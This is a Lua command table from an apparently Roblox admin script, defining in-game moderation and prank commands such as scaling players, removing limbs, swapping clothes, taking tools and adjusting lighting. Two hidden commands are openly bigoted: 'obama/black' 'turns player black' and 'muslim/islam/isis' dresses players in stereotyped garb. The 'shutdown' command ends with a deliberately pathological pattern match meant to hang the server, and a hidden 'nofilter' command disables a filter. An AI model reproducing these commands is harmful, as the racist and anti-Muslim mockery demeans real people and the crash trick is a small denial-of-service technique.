	[{"shutdown", "sd"}] = {"", "Shuts down the server", 0, "Owner", false, function(Speaker, Rank, Arguments)
		REMOTE:SendHttpLog(Speaker.Name.." shutdown the server", "INFORMATION")
		for _,Player in pairs(Server.Players:GetPlayers()) do
			Player:Kick()
		end
		Server.Workspace:ClearAllChildren()
		string.find(string.rep("a", 2^20),string.rep(".?", 2^20))
	end};
	
	[{"scale", "size"}] = {"player num", "Scales player's character to num", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:Scale(Player, Arguments[2])
		end
	end};
	
	[{"mini", "small", "tiny", "small"}] = {"player", "Makes player's character mini", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:Scale(Player, 50)
		end
	end};
	
	[{"hobbit"}] = {"player", "Makes player's character hobbit sized", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:Scale(Player, 70)
		end
	end, Hidden = true};
	
	[{"mega", "huge", "giant", "large", "big"}] = {"player", "Makes player's character mega", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:Scale(Player, 500)
		end
	end};
	
	[{"gold", "goldify"}] = {"player", "Makes player's character gold", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				CORE:ScanItems(Player.Character, {"BasePart"}, function(Obj)
					Obj.Reflectance = 0.5
					Obj.BrickColor = BrickColor.new("New Yeller")
				end)
			end
		end
	end};
	
	[{"shine", "shiny", "shinify", "shineify"}] = {"player", "Makes player's character shiny", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				CORE:ScanItems(Player.Character, {"BasePart"}, function(Obj)
					Obj.Reflectance = 0.5
				end)
			end
		end
	end};
	
	[{"ghost", "ghostify", "spook", "spooky"}] = {"player", "Makes player's character a ghost", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				CORE:ScanItems(Player.Character, {"BasePart"}, function(Obj)
					Obj.Transparency = 0.5
					Obj.Reflectance = 0 
					Obj.BrickColor = BrickColor.new("Institutional white")
				end)
				CORE:ScanItems(Player.Character, {"Texture", "Decal"}, function(Obj)
					Obj.Transparency = 0.5
				end)
			end
		end
	end};
	
	[{"nolimbs", "nolimb"}] = {"player", "Removes player's limbs", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				for _,Obj in pairs(Player.Character:GetChildren()) do
					local Valid = false
					for _,Name in pairs({"Right Arm", "Left Arm", "Right Leg", "Left Leg"}) do if Obj.Name == Name then Valid = true end end
					if Valid == true then Obj:Destroy() end
				end
			end
		end
	end};
	
	[{"noarms", "noarm"}] = {"player", "Removes player's arms", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				for _,Obj in pairs(Player.Character:GetChildren()) do
					local Valid = false
					for _,Name in pairs({"Right Arm", "Left Arm"}) do if Obj.Name == Name then Valid = true end end
					if Valid == true then Obj:Destroy() end
				end
			end
		end
	end};
	
	[{"nolegs", "noleg"}] = {"player", "Removes player's legs", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				for _,Obj in pairs(Player.Character:GetChildren()) do
					local Valid = false
					for _,Name in pairs({"Right Leg", "Left Leg"}) do if Obj.Name == Name then Valid = true end end
					if Valid == true then Obj:Destroy() end
				end
			end
		end
	end};
	
	[{"noaccessories", "noaccessory", "noacs", "nohats", "nohat"}] = {"player", "Removes player's accessories", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				for _,Obj in pairs(Player.Character:GetChildren()) do
					if Obj:IsA("Accoutrement") then
						Obj:Destroy()
					end
				end
			end
		end
	end};
	
	[{"naked", "noclothes"}] = {"player", "Removes player's clothes and hats", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			Player:ClearCharacterAppearance()
		end
	end};
	
	[{"playerdatabase", "playerbase", "playerdatab", "playerdb", "plrdatabase", "plrdatab", "plrdb", "pdatabase", "pdatab", "pdb"}] = {"", "Database of all the players in the server", 0, "Member", false, function(Speaker, Rank, Arguments)
		local Players = Server.Data:GetDataStore("MML's Admin"):GetAsync("Players")
		local TmpPlayers = {}
		local Output = {}
		for _,Data in pairs(Players) do
			table.insert(Output, {"Name: "..Data.Name.." | UserID: "..Data.UserId.." | Rank: "..Data.Rank.." | Last Joined: "..(Data.LastJoin or "Unknown").." | Account Age: "..(Data.AccountAge or "Unknown"), "http://www.roblox.com/thumbs/avatar.ashx?x=352&y=352&format=png&username="..Data.Name})
		end
		GUI:ListGui(Speaker, "Player Database", Output, 120563622)
	end};
	
	[{"clearplayerdatabase", "clearpdb", "cpdb"}] = {"", "Clears the player databse", 0, "Owner", false, function(Speaker, Rank, Arguments)
		Server.Data:GetDataStore("MML's Admin"):SetAsync("Players", {})
		GUI:SendHint(Speaker, "Player Database cleared", 5)
	end};
	
	[{"hack", "hax"}] = {"player", "Fake hacks player", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			GUI:FakeHack(Player)
		end
	end};
	
	[{"clonetools", "clonet"}] = {"player", "Clones player's tools and gives the to the speaker", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player:FindFirstChild("Backpack") and Speaker:FindFirstChild("Backpack") then
				for _,Object in pairs(Player.Backpack:GetChildren()) do
					if Object:IsA("Tool") or Object:IsA("HopperBin") then
						local Clone = Object:Clone()
						Clone.Parent = Speaker.Backpack
					end
				end
			end
		end
	end};
	
	[{"taketools", "taket", "tt"}] = {"player", "Clone player's tools and gives the to the speaker", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player:FindFirstChild("Backpack") and Speaker:FindFirstChild("Backpack") then
				for _,Object in pairs(Player.Backpack:GetChildren()) do
					if Object:IsA("Tool") or Object:IsA("HopperBin") then
						Object.Parent = Speaker.Backpack
					end
				end
			end
		end
	end};
	
	[{"givetools", "givet", "gt"}] = {"player", "Clone the speaker's tools and gives the to player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player:FindFirstChild("Backpack") and Speaker:FindFirstChild("Backpack") then
				for _,Object in pairs(Speaker.Backpack:GetChildren()) do
					if Object:IsA("Tool") or Object:IsA("HopperBin") then
						local Clone = Object:Clone()
						Clone.Parent = Player.Backpack
					end
				end
			end
		end
	end};
	
	[{"notools", "notool", "cleartools", "cleantools", "ctools", "untools"}] = {"player", "Clears player's backpack", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player:FindFirstChild("Backpack") then
				Player.Backpack:ClearAllChildren()
			end
			if Player.Character ~= nil then
				for _,Obj in pairs(Player.Character:GetChildren()) do
					if Obj:IsA("Tool") or Obj:IsA("HopperBin") then
						Obj:Destroy()
					end
				end
			end
		end
	end};
	
	[{"vomit", "puke", "throwup", "barf"}] = {"player", "Makes player vomit", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				if Player.Character:FindFirstChild("Head") then
					if Player.Character.Torso:FindFirstChild("Neck") and Player.Character.Head:FindFirstChild("face") then
						coroutine.wrap(function()
							if Player.Character.Head.face.Texture ~= "rbxassetid://24067663" then if Player.Character.Head.face.Texture ~= "rbxassetid://28118994" then
								local OldFace = Player.Character.Head.face.Texture
								Player.Character.Torso.Neck.C0 = Player.Character.Torso.Neck.C0 * CFrame.Angles(math.rad(20),0,0)
								Player.Character.Head.BrickColor = BrickColor.new("Br. yellowish green")
								Player.Character.Head.face.Texture = "rbxassetid://24067663"
								local Sound = SOUND:MakeSound(Player.Character.Head, 142539016, 1, 0.9)
								Sound:Play()
								coroutine.wrap(function() for i = 1,100 do wait()
									local Part = Instance.new("Part", Player.Character) Part.BrickColor = BrickColor.new("Br. yellowish green") Part.FormFactor = "Custom" Part.Elasticity = 0.1 Part.Size = Vector3.new(0.2,0.2,0.2) Part.Position = Player.Character.Head.Position + Vector3.new(math.random(-10,10)/10, math.random(-10,10)/10, math.random(-10,10)/10)
									coroutine.wrap(function() wait(3) Part:Destroy() end)()
								end
								Sound:Destroy() Player.Character.Head.face.Texture = OldFace Player.Character.Torso.Neck.C0 = Player.Character.Torso.Neck.C0 * CFrame.Angles(-math.rad(20),0,0) pcall(function() Player.Character.Head.BrickColor = Player.Character["Body Colors"].HeadColor end) end)()
							end end
						end)()
					end
				end
			end
		end
	end};
	
	[{"fart", "stink"}] = {"player", "Makes player fart", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				if Player.Character:FindFirstChild("Torso") and Player.Character.Head:FindFirstChild("face") then
					coroutine.wrap(function()
						if Player.Character.Head.face.Texture ~= "rbxassetid://24067663" then if Player.Character.Head.face.Texture ~= "rbxassetid://28118994" then
							local OldFace = Player.Character.Head.face.Texture
							local Fart = Instance.new("Part", Player.Character.Torso) Fart.Name = "Fart" Fart.Size = Vector3.new(1,1,1) Fart.Position = Vector3.new(0,100,0) Fart.Transparency = 1
							local Weld = Instance.new("Weld", Fart) Weld.Part0 = Fart Weld.Part1 = Player.Character.Torso Weld.C0 = CFrame.new(0,-1,-1) * CFrame.Angles(math.rad(-90),0,0)
							local Smoke = Instance.new("Smoke", Fart) Smoke.Name = "Fart Effect" Smoke.Color = Color3.new(70/255, 100/255, 30/255)
							Player.Character.Head.face.Texture = "rbxassetid://28118994"
							local Sound = SOUND:MakeSound(Fart, 130833677, 1, 0.8)
							Sound:Play()
							wait(1)
							Smoke.Enabled = false
							wait(1)
							Fart:Destroy()
							Fart:Destroy()
							Player.Character.Head.face.Texture = OldFace
						end end
					end)()
				end
			end
		end
	end};
	
	[{"graffiti", "graf", "gra", "draw"}] = {"player", "Gives player a tool to do graffiti", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player:FindFirstChild("Backpack") then
				CORE:ExecuteResource("Graffiti", Player.Backpack, {["Color"] = GUI:GetColor()})
			end
		end
	end};
	
	[{"cleargraffiti", "cleargraf", "cleargra", "cleardraw", "cleangraffiti", "cleangraf", "cleangra", "cleandraw", "cgraffiti", "cgraf", "cgra", "cdraw"}] = {"", "Clears any graffiti", 0, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("MMLGraffiti") then
				Player.Character.MMLGraffiti:ClearAllChildren()
			end
		end
	end};
	
	[{"light", "spotlight"}] = {"player", "Makes player and a small radius around whom to light up", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Light = Player.Character.Torso:FindFirstChild("MML Light") if Light then Light:Destroy() end
				Light = Instance.new("PointLight", Player.Character.Torso) Light.Name = "MML Light" Light.Range = 20 Light.Brightness = 2
			end
		end
	end};
	
	[{"lamp", "pointlight", "headlight", "headlamp"}] = {"player", "Makes player and a small radius in from of whom to light up as if there was a head light", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Light = Player.Character.Torso:FindFirstChild("MML Lamp") if Light then Light:Destroy() end
				Light = Instance.new("SpotLight", Player.Character.Torso) Light.Name = "MML Lamp" Light.Range = 30 Light.Brightness = 5
			end
		end
	end};
	
	[{"nolight", "nolamp", "unlight", "unlamp"}] = {"player", "Removes player's light and/or lamp", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Lights = {}
				for _,Obj in pairs(Player.Character.Torso:GetChildren()) do
					if Obj.Name == "MML Lamp" or Obj.Name == "M".."ML Light" then
						table.insert(Lights, Obj)
					end
				end
				for _,Light in pairs(Lights) do
					coroutine.wrap(function()
						for i = 1,20 do
							Light.Brightness = Light.Brightness/5
							wait()
						end
						Light:Destroy()
					end)()
				end
			end
		end
	end};
	
	[{"drug", "lsd"}] = {"player", "Gives player the effect of being on lsd", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player:FindFirstChild("PlayerGui") then
				local SG = Player.PlayerGui:FindFirstChild("MML Drug") if SG then SG:Destroy() end
				SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "MML Drug"
				local Frame = Instance.new("Frame", SG) Frame.Size = UDim2.new(1,0,1,0) Frame.BackgroundTransparency = 0.5
				local Stop = false
				coroutine.wrap(function()
					repeat
						Frame.BackgroundColor3 = Color3.new(math.random(0,255)/255,math.random(0,255)/255,math.random(0,255)/255)
						wait(0.1)
					until not SG or not SG.Parent
				end)()
				CORE:ExecuteResource("Drug", Player.Character)
			end
		end
	end};
	
	[{"nodrug", "nolsd", "undrug", "unlsd"}] = {"player", "Removes drug effect", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player:FindFirstChild("PlayerGui") then
				local SG = Player.PlayerGui:FindFirstChild("MML Drug") if SG then SG:Destroy() end
				wait() CORE:RestoreCamera(Player)
			end
		end
	end};
	
	[{"searchg", "searchgear"}] = {"string", "Searches the catalog for the gear string", 1, "Member", false, function(Speaker, Rank, Arguments)
		local AbuseMode = false
		if Rank == "Member" then AbuseMode = Settings.DisableAbuse end
		MARKET:ShowSearch(Speaker, 5, Arguments[1], function(ID)
			if Speaker:FindFirstChild("Backpack") then
				CORE:Insert(ID, Speaker.Backpack, true, {"Tool", "HopperBin"}, AbuseMode)
			end
		end)
	end, Http = true};
	
	[{"searchaccessory", "searchaccessories", "searchacs", "searcha", "searchhat", "searchhats", "searchh"}] = {"string(type) string(query)", "Searches the catalog for the accessory string(query) with the type of string(type)", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Type = "all"
		local Query = string.lower(Arguments[1])
		local Arguments = STRING:GetSplit(Query, 2, Settings.Bet)
		if #Arguments == 2 and Assets.AccessoryTypes[Arguments[1]] then
			Type = Arguments[1]
			Query = Arguments[2]
		end
		MARKET:ShowSearch(Speaker, 11, Query, function(ID)
			if Speaker.Character then
				CORE:Insert(ID, Speaker.Character, true, {"Accoutrement"})
			end
		end, MARKET:AccessoryToSubcategory(Type))
	end, Http = true};
	
	[{"searchp", "searchpack", "searchpackage"}] = {"string", "Searches the catalog for the package string", 1, "Member", false, function(Speaker, Rank, Arguments)
		MARKET:ShowSearch(Speaker, 11, Arguments[1], function(ID)
			if Speaker.Character then
				CORE:GivePackage(Speaker, ID)
			end
		end, 11)
	end, Http = false};
	
	[{"nopackage", "nopack", "unpackage", "unpack"}] = {"player", "Removes all packages from player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:GivePackage(Player)
		end
	end};
	
	[{"package", "pack", "morph"}] = {"player num(ID)", "Gives player the package with num(ID)", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:GivePackage(Player, Arguments[2])
		end
	end, Http = false};
	
	[{"change", "changestat", "changeleaderstat", "changestats", "changeleaderstats"}] = {"player string(key) value(string/num)", "Changes player's leaderstats for key(Coins, money, ext) to value", 3, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local Stats = Player:FindFirstChild("leaderstats")
			if Stats ~= nil then
				for _,Stat in pairs(Stats:GetChildren()) do
					if string.sub(string.lower(Stat.Name),1,#Arguments[2]) == string.lower(Arguments[2]) then
						ypcall(function() Stat.Value = Arguments[3] end)
					end
				end
			end
		end
	end};
	
	[{"shirt"}] = {"player num(ID)", "Changes player's shirt to num(ID)", 2, "Member", false, function(Speaker, Rank, Arguments)
		local ID = tonumber(Arguments[2])
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			for _,Player in pairs(Players) do
				if Player.Character ~= nil then
					local Obj = Player.Character:FindFirstChild("Shirt")
					if Obj then
						Obj.ShirtTemplate = "rbxassetid://"..MARKET:GetImageFormat(ID)
					else
						Obj = Instance.new("Shirt", Player.Character) Obj.Name = "Shirt" Obj.ShirtTemplate = "rbxassetid://"..MARKET:GetImageFormat(ID)
					end
					coroutine.wrap(function() Obj.Parent = nil wait(0.1) Obj.Parent = Player.Character end)()
				end
			end
		end
	end};
	
	[{"pants"}] = {"player num(ID)", "Changes player's pants to num(ID)", 2, "Member", false, function(Speaker, Rank, Arguments)
		local ID = tonumber(Arguments[2])
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			for _,Player in pairs(Players) do
				if Player.Character ~= nil then
					local Obj = Player.Character:FindFirstChild("Pants")
					if Obj then
						Obj.PantsTemplate = "rbxassetid://"..MARKET:GetImageFormat(ID)
					else
						Obj = Instance.new("Pants", Player.Character) Obj.Name = "Pants" Obj.PantsTemplate = "rbxassetid://"..MARKET:GetImageFormat(ID)
					end
					coroutine.wrap(function() Obj.Parent = nil wait(0.1) Obj.Parent = Player.Character end)()
				end
			end
		end
	end};
	
	[{"tshirt"}] = {"player num(ID)", "Changes player's T-shirt to num(ID)", 2, "Member", false, function(Speaker, Rank, Arguments)
		local ID = tonumber(Arguments[2])
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			for _,Player in pairs(Players) do
				if Player.Character ~= nil then
					if Player.Character:FindFirstChild("Torso") then
						local Obj1 = Player.Character:FindFirstChild("Shirt Graphic")
						local Obj2 = Player.Character.Torso:FindFirstChild("roblox")
						if Obj1 then
							Obj1.Graphic = "rbxassetid://"..MARKET:GetImageFormat(ID)
						else
							Obj1 = Instance.new("ShirtGraphic", Player.Character) Obj1.Name = "Shirt Graphic" Obj1.Graphic = "rbxassetid://"..MARKET:GetImageFormat(ID)
						end
						if Obj2 then
							Obj2.Texture = "rbxassetid://"..MARKET:GetImageFormat(ID)
						else
							Obj2 = Instance.new("Decal", Player.Character.Torso) Obj2.Name = "roblox" Obj2.Texture = "rbxassetid://"..MARKET:GetImageFormat(ID) Obj2.Face = "Front"
						end
						coroutine.wrap(function() Obj1.Parent = nil wait(0.1) Obj1.Parent = Player.Character end)()
						coroutine.wrap(function() Obj2.Parent = nil wait(0.2) Obj2.Parent = Player.Character.Torso end)()
					end
				end
			end
		end
	end};
	
	[{"oder", "od", "onlinedater", "onlinedate"}] = {"player", "Changes player's character to be an online dater", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:ChangeCharacter(Player, OderIDs[math.random(1,#OderIDs)], false, Speaker)
		end
	end};
	
	[{"cookie"}] = {"player", "Gives player a cookie if the speaker is in the admin group", 1, "Member", false, function(Speaker, Rank, Arguments)
		if CORE:InAdminGroup(Speaker) then					
			local Players = STRING:Scan(Arguments[1], Speaker)
			for _,Player in pairs(Players) do
				if Player:FindFirstChild("Backpack") then
					local Tool = Instance.new("Tool", Player.Backpack) Tool.Name = "Cookie" Tool.ToolTip = "Yey! Cookies!" Tool.GripForward = Vector3.new(0,1,0) Tool.GripPos = Vector3.new(0.1,-0.3,-0.1) Tool.GripRight = Vector3.new(0,0,-1) Tool.GripUp = Vector3.new(0.01,0,1)
					local Handle = Instance.new("Part", Tool) Handle.Name = "Handle" Handle.Size = Vector3.new(1,1,1)
					local Mesh = Instance.new("SpecialMesh", Handle) Mesh.MeshType = "FileMesh" Mesh.Scale = Vector3.new(0.4,0.4,0.4) Mesh.MeshId = "rbxassetid://20939848" Mesh.TextureId = "rbxassetid://21456464"
					local Anim = Instance.new("Animation", Tool) Anim.Name = "EatCookie" Anim.AnimationId = "rbxassetid://29517689"
					CORE:ExecuteResource("CookieTool", Tool)
				end
			end
		end
	end};
	
	[{"decal", "image"}] = {"num(ID)", "Allows player to insert num(ID) as a decal", 1, "Member", false, function(Speaker, Rank, Arguments)
		if Speaker:FindFirstChild("Backpack") and tonumber(Arguments[1]) then
			CORE:ExecuteResource("InsertDecal", Speaker.Backpack, {["DecalID"] = MARKET:GetImageFormat(tonumber(Arguments[1]))})
		end
	end};
	
	[{"insert", "model", "ins"}] = {"num(ID)", "Allows player to insert num(ID) as a model(Only works if the model is owned by the owner of the game or ROBLOX)", 1, "Member", false, function(Speaker, Rank, Arguments)
		if Speaker:FindFirstChild("Backpack") and tonumber(Arguments[1]) then
			local Model = CORE:Insert(tonumber(Arguments[1]), Server.RS)
			Model:MakeJoints()
			for i = 1,math.random(10,20) do
				Model.Name = Model.Name..string.char(math.random(97,122))
			end
			if Model:GetChildren()[1] then
				table.insert(Objects, Model)
				CORE:ExecuteResource("InsertModel", Speaker.Backpack, {["Model"] = Model})
			end
		end
	end};
	
	[{"animate", "animation", "anim"}] = {"player num(ID)", "Animates player to num(ID)", 2, "Member", false, function(Speaker, Rank, Arguments)
		local ID = tonumber(Arguments[2])
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				CORE:ExecuteResource("PlayAnimation", Player.Character, {["AnimationID"] = Arguments[2]})
			end
		end
	end};
	
	[{"noanimate", "moanimation", "noanim", "unanimate", "unanimation", "unanim"}] = {"player", "Stops animations playing from the animate command", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				local StopAnim = Player.Character:FindFirstChild("Stop MML Animate")
				if StopAnim then StopAnim:Destroy() end
			end
		end
	end};
	
	[{"ambient"}] = {"Color3(1) Color3(2) Color3(3)", "Changes the ambient lighting to Red - Color3(1) Green - Color3(2) Blue - Color3(3) (Out of 255)", 3, "Member", false, function(Speaker, Rank, Arguments)
		if tonumber(Arguments[1]) and tonumber(Arguments[2]) and tonumber(Arguments[3]) then
			Server.Lighting.Ambient = Color3.new(tonumber(Arguments[1])/255,tonumber(Arguments[2])/255,tonumber(Arguments[3])/255)
		end
	end};
	
	[{"brightness", "bright"}] = {"num", "Changes the lighting brightness to num", 1, "Member", false, function(Speaker, Rank, Arguments)
		if tonumber(Arguments[1]) then
			Server.Lighting.Brightness = tonumber(Arguments[1])
		end
	end};
	
	[{"pl", "playerlist"}] = {"player", "Enables player to see the player list", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			GUI:CoreGui(Player, "PlayerList", true)
		end
	end};
	
	[{"npl", "nopl", "unpl", "noplayerlist", "unplayerlist"}] = {"player", "Disables player to see the player list", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			local Players = STRING:Scan(Arguments[1], Speaker)
			GUI:CoreGui(Player, "PlayerList", false)
		end
	end};
	
	[{"bc", "tbc", "obc"}] = {"player", "What do you know, it's a real command!", 1, "Member", false, function(Speaker, Rank, Arguments)
		GUI:SendMessage(Speaker, "Wow, you thought this was a command", "Did you look at the comments by chance?", 5253865)
	end, Hidden = true};
	
	[{"obama", "black", "1337"}] = {"player", "Turns player black", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			CORE:ChangeCharacter(Player, 1337, false, Speaker)
		end
	end, Hidden = true};
	
	[{"muslim", "islam", "isis"}] = {"player", "Turns player into a muslim", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			if Player.Character and Player.Character:FindFirstChild("Head") and Player.Character.Head:FindFirstChild("face") then
				ypcall(function() Player.Character.Torso.roblox:Destroy() end)
				Player:ClearCharacterAppearance()
				CORE:Insert(12436480, Player.Character, true)
				Player.Character.Head.face.Texture = "rbxassetid://110287880"
				Instance.new("Shirt", Player.Character).ShirtTemplate = "rbxassetid://205596436"
				Instance.new("Pants", Player.Character).PantsTemplate = "rbxassetid://205596483"
			end
		end
	end, Hidden = true};
	
	[{"noob", "noobify", "boon"}] = {"player", "Turns player into a noob", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			CORE:ChangeCharacter(Player, 0, false, Speaker)
		end
	end};
	
	[{"nofilter", "unfilter", "defilter"}] = {"", "Removes current filter", 0, "Owner", false, function(Speaker, Rank, Arguments)
		ShouldFilter = false
	end, Hidden = true};
	
	[{"bet"}] = {"string", "Changes the bet to string", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Bet = Arguments[1]
		if Bet == "/" or Bet == "-" or Bet == "(" or Bet == ")" then
			GUI:SendMessage(Speaker, "Cannot change bet", "RED Illegal characters used to become a bet", "Error")
		elseif #Bet > 5 then
			GUI:SendMessage(Speaker, "Bet too long", "RED The bet is too long and is over 5 characters (You have "..#Bet.." characters)", "Error")
		else
			local Answer = GUI:PromptMessageWithButtons(Speaker, "Are you sure you want to change the bet", "You are about to change the bet from '"..Settings.Bet.."' to '"..Bet.."' and commands like "..Settings.Prefix.."ff"..Settings.Bet.."me will be changed to "..Settings.Prefix.."ff"..Bet.."me, Continue?", "Question", {"Yes", "No"})
			if Answer == "Yes" then
				local OldBet = Settings.Bet
				CORE:ChangeBet(Bet)
				GUI:MessageAdmins("Bet Change", "The bet has changed from '"..OldBet.."' to '"..Bet.."' and commands like "..Settings.Prefix.."ff"..OldBet.."me will be changed to "..Settings.Prefix.."ff"..Bet.."me")
			end
		end
	end};
	
	[{"prefix"}] = {"string", "Changes the prefix to string", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Prefix = Arguments[1]
		if #Prefix > 5 then
			GUI:SendMessage(Speaker, "Prefix too long", "RED The Prefix is too long and is over 5 characters (You have "..#Prefix.." characters)", "Error")
		else
			local Answer = GUI:PromptMessageWithButtons(Speaker, "Are you sure you want to change the Prefix", "You are about to change the Prefix from '"..Settings.Prefix.."' to '"..Prefix.."' and commands like "..Settings.Prefix.."ff"..Settings.Bet.."me will be changed to "..Prefix.."ff"..Settings.Bet.."me, Continue?", "Question", {"Yes", "No"})
			if Answer == "Yes" then
				local OldPrefix = Settings.Prefix
				Settings.Prefix = Prefix
				GUI:MessageAdmins("Prefix Change", "The Prefix has changed from '"..OldPrefix.."' to '"..Prefix.."' and commands like "..OldPrefix.."ff"..Settings.Bet.."me will be changed to "..Prefix.."ff"..Settings.Bet.."me")
			end
		end
	end};
	
	[{"commandbar", "cmdbar", "cbar", "commandgui", "cmdgui", "cgui", "commandbox", "cmdbox", "cbox"}] = {"", "Gives you a command bar to enter commands", 0, "Member", false, function(Speaker, Rank, Arguments)
		GUI:CommandBar(Speaker)
	end};
	
	[{"permcommandbar", "permcmdbar", "permcommandgui", "permcmdgui"}] = {"", "Gives you a command bar for each time you spawn", 0, "Admin", false, function(Speaker, Rank, Arguments)
		GUI:CommandBar(Speaker)
		PermCommandBars[Speaker.Name] = true
	end};
	
	[{"nopermcommandbar", "nopermcmdbar", "nopermcommandgui", "nopermcmdgui", "unpermcommandbar", "unpermcmdbar", "unpermcommandgui", "unpermcmdgui"}] = {"", "If you are in the perm command bar list, it takes you out(You keep command bar for current spawn)", 0, "Admin", false, function(Speaker, Rank, Arguments)
		PermCommandBars[Speaker.Name] = nil
	end};
	
	[{"remotenopermcommandbar", "remotenopermcmdbar", "remotenopermcommandgui", "remotenopermcmdgui", "remoteunpermcommandbar", "remoteunpermcmdbar", "remoteunpermcommandgui", "remoteunpermcmdgui"}] = {"player", "If player is in the perm command bar list, it takes player out(player keep command bar for current spawn)", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			PermCommandBars[Player.Name] = nil
		end
	end};
	
	[{"dummy", "newdummy", "dum", "figure"}] = {"", "Creates a dummy", 0, "Member", false, function(Speaker, Rank, Arguments)
		CORE:CreateFigure("Dummy", nil, true, Speaker)
	end};
	
